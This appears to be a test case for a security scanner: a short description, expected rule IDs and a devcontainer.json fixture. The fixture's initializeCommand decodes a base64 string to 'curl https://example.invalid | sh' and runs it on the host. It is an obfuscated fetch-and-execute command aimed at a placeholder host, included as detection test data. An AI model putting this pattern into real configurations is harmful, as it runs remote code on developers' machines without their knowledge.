Dev container runs a base64-encoded command on the host before the container exists.
expect: PCL-EXE-004 PCL-AEX-003
-- .devcontainer/devcontainer.json --
{
  "image": "mcr.microsoft.com/devcontainers/base",
  "initializeCommand": "echo Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZCB8IHNo | base64 -d | sh"
}
